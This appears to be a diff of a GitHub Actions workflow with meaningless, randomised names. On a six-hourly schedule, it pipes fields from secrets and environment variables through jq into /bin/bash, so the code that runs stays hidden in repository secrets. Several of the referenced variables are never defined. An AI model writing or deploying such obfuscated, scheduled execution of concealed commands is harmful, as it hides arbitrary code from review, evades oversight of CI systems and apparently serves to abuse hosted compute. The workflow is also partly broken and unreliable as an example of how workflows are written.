@@ -2,25 +2,19 @@ name: aboardsoil
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 2/6 * * *'
+    - cron: '11 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: aboardsoil
         env:
-          zosv0134: ${{ secrets.zosv0134 }}
+          j8: ${{ secrets.j8 }}
         run: |
-          echo $zosv0134 | jq -r .k75387 | /bin/bash
-          echo $e8 | jq -r .qtoo1 | /bin/bash
-          echo $hul7551 | jq -r .zaui6240 | /bin/bash
-          echo $v88 | jq -r .uw07044 | /bin/bash
-          echo $uwtjo05 | jq -r .d6 | /bin/bash
-          echo $gbd6 | jq -r .kia95804 | /bin/bash
-          echo $dfg36 | jq -r .kji433 | /bin/bash
-          echo $g85563 | jq -r .tnv14 | /bin/bash
-          echo $z96198 | jq -r .fdsgj85021 | /bin/bash
-          echo $rkn25 | jq -r .otru9877 | /bin/bash
+          echo $j8 | jq -r .wylel6 | /bin/bash
+          echo $nkc7470 | jq -r .jawbt1369 | /bin/bash
+          echo $va17967 | jq -r .mu28120 | /bin/bash
+          echo $iz022 | jq -r .qiyg69627 | /bin/bash
 
